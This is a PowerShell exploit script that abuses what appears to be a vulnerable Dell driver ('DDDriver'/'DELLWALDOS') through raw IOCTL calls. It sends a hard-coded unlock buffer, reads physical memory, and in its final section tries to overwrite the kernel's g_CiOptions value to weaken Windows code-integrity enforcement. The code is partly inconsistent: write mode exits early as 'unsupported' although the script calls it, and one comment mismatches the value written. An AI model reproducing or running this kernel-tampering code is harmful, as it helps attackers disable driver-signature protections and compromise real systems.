Function Invoke-MemoryAction {
    param (
        [Int64]$PA,

        [ValidateSet('Read', 'Write')]
        [string]$Mode = 'Read',

        # Case Write (System State Write - IOCTL -1673518044)
        [Byte[]]$Data,
    
        # Case Read (Physical Read - IOCTL -1673518052)
        [Int32]$Length = 0
    )

    if ($Mode -eq 'Read') {
        $ioctl = -1673518052
    } else {
        $ioctl = -1673518044
        Write-warning "Write mode is unsupported"
        return $null
    }

    try {
        $hDevice = Get-FileHandle -FileName 'DDDriver' -AlternativeName 'DELLWALDOS'
        if ($hDevice -eq $null -or $hDevice -eq 0 -or $hDevice -eq -1) { 
            throw "Failed to open a handle to the driver." 
        }

        [byte[]]$FinalBuffer = @(
            0xC7, 0xC8, 0x77, 0x6E, 0x1E, 0x57, 0xBD, 0xA8,
            0x89, 0x78, 0x1B, 0x63, 0xCB, 0x06, 0x92, 0x75,
            0x2A, 0x68, 0xBE, 0xA6, 0x6E, 0x83, 0x2B, 0x53,
            0xCA, 0x07, 0x7E, 0x78, 0x2F, 0x56, 0xCC, 0x28,
            0x82, 0x78, 0x1C, 0x54, 0xB9, 0x07, 0x68, 0x76,
            0x2B, 0x68, 0xBD, 0x66, 0x67, 0x95, 0x1D, 0x57,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x01, 0x01, 0x01, 0x01, 0x01
        )

        $lpInBuffer = [Marshal]::AllocHGlobal(70)
        $lpOutBuffer = [Marshal]::AllocHGlobal(70)

        try {
            [Marshal]::Copy($FinalBuffer, 0, $lpInBuffer, 70)
            $Status = $NtApi::DeviceIoControl(
                $hDevice,  0x9C40A45C,   
                $lpInBuffer, 70,
                $lpOutBuffer, 70,
                [IntPtr]::Zero,
                [IntPtr]::Zero
            )

            if (-not $Status) {
                throw "[-] Transaction completed but driver rejected data."
            }
        }
        finally {
            # Clean up native allocations
            [Marshal]::FreeHGlobal($lpInBuffer)
            [Marshal]::FreeHGlobal($lpOutBuffer)
        }

        if ($Mode -eq 'Read') {
            $InBuf = [Marshal]::AllocHGlobal(8)
            $OutBuf = [Marshal]::AllocHGlobal($Length)
            [Marshal]::WriteInt64($InBuf, 0, $PA)

            $Result = $NtApi::DeviceIoControl(
                $hDevice, $ioctl, 
                $InBuf, 8,          # Input Size must be 8 (Size of Int64 PA)
                $OutBuf, $Length,   # Output Size matching requested read space
                [IntPtr]::Zero, 
                [IntPtr]::Zero
            )

            if (-not $Result) {
                throw "DeviceIoControl Read Call Failed." }

            $ManagedBytes = New-Object Byte[] $Length
            [Marshal]::Copy($OutBuf, $ManagedBytes, 0, $Length)
            [Marshal]::FreeHGlobal($InBuf)
            [Marshal]::FreeHGlobal($OutBuf)

            return $ManagedBytes
        
        } else {

            $HeaderSize = 8
            $RequiredSize = $HeaderSize + $Data.Length
            $BufferSize = if ($RequiredSize -lt 384) { 384 } else { $RequiredSize }

            $ConstructedBytes = New-Object byte[] $BufferSize
           #[BitConverter]::GetBytes([Int64]$PA).CopyTo($ConstructedBytes, 0)
            [BitConverter]::GetBytes([int32]1145392204).CopyTo($ConstructedBytes, 4)
            [System.Array]::Copy($Data, 0, $ConstructedBytes, 8, $Data.Length)

            $WriteBuf = New-IntPtr -Data $ConstructedBytes
            $OutBuf   = New-IntPtr -Size $BufferSize
            $BytesRet = New-IntPtr -Size 4

            $Result = $NtApi::DeviceIoControl(
                $hDevice, $ioctl, 
                $WriteBuf, $BufferSize,   # Options constraint (Dynamic)
                $WriteBuf, $BufferSize,   # Length constraint (Dynamic)
                $BytesRet,  [IntPtr]::Zero
            )
            Free-IntPtr $BytesRet

            if (-not $Result) { 
                throw "DeviceIoControl Write Call Failed." 
            }

            [Marshal]::FreeHGlobal($WriteBuf)
            return $True
        }

    } catch {
        Write-Error $_
    } finally {
        # Safe structural handle cleanup matching your original framework
        if ($hDevice -and $hDevice -ne [IntPtr]::Zero -and $hDevice -ne -1) {
            Free-IntPtr -handle $hDevice -Method NtHandle
        }
    }
}

Clear-Host
Write-Host

$VA = Get-gCiOptionsAddress
$PA = Convert-VirtualToPhysical $VA

Write-Host 'Preserve Original value' -ForegroundColor Green
Write-Host

$Data = Invoke-MemoryAction -PA $PA -Mode Read -Length 4
Write-Host ("Return Value ? {0}" -f ([System.BitConverter]::ToInt32($Data, 0)))

# write 6
Invoke-MemoryAction -PA $PA -Mode Write -Data ([System.BitConverter]::GetBytes([Int32]1))

$Data = Invoke-MemoryAction -PA $PA -Mode Read -Length 4
Write-Host ("Return Value ? {0}" -f ([System.BitConverter]::ToInt32($Data, 0)))

# write 16390
Invoke-MemoryAction -PA $PA -Mode Write -Data ([System.BitConverter]::GetBytes([Int32]16390))
$Data = Invoke-MemoryAction -PA $PA -Mode Read -Length 4
Write-Host ("Return Value ? {0}" -f ([System.BitConverter]::ToInt32($Data, 0)))